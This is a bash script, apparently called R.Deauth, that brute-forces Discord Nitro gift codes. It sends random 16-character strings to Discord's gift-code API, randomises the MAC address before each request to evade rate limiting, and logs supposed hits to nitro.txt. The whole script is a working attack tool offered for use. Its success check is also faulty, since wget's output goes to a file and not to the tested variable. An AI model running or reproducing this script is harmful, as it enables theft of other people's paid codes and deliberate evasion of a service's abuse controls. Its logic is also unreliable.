#!/bin/bash
lgreen="\e[92m"
lred="\e[91m"
nc="\e[39m"
enablemacchanger=0

interface=$(netstat -r | grep "default" | awk {'print $8'})

function exitprogram()
{
	echo ""
	echo -e $lgreen"Aight bet..."
	echo -e $lred"cya soon XD"
	exit 0
}

function checktools()
{
	wgettool=`which wget`
	if [[ "$?" != "0" ]]; then
		echo -e $lred"wget not found need to install..."
		sudo apt-get install wget
	fi
	macchangertool=`which macchanger`
	if [[ "$?" != "0" ]]; then
    	echo -e $lred"macchanger not found neet to install..."
    	sudo apt-get install macchanger
	fi
	echo -e $lgreen"All tools are installed :)"
	sleep 2
}

function checkroot()
{
	if [ $(id -u) != "0" ]; then
		echo ""
		echo You need to be root to run this script...
		echo Please start R.Deauth with [sudo ./start.sh]
		exit
	else
		echo YAY your root user!
		sleep 1
		clear
	fi
}

checkroot
checktools
trap exitprogram EXIT
echo -e $lgreen"Starting..."
echo ""
echo "Scanning for links..."
sleep 1
while :
do
	for nitro in `cat /dev/urandom | tr -dc 'A-Z-a-z-0-9' | fold -w 16 | head -n 1`; do
		ifconfig $interface down
		macchanger -r $interface
		ifconfig $interface up
		printf "Discord Invite: $nitro "
		result=`wget https://discord.com/api/v6/entitlements/gift-codes/$nitro`
		if [[ $(echo $result | head -1) =~ "<html>" ]]; then
			echo -e $lgreen"Works"
			sleep 2
			file="nitro.txt"
			if [[ -f "$file" ]]; then
				echo "https://discord.gift/$nitro" >> nitro.txt
			else
				echo "https://discord.gift/$nitro" > nitro.txt
			fi
		else
			echo -e $lred "Failed"
		fi
	done

done
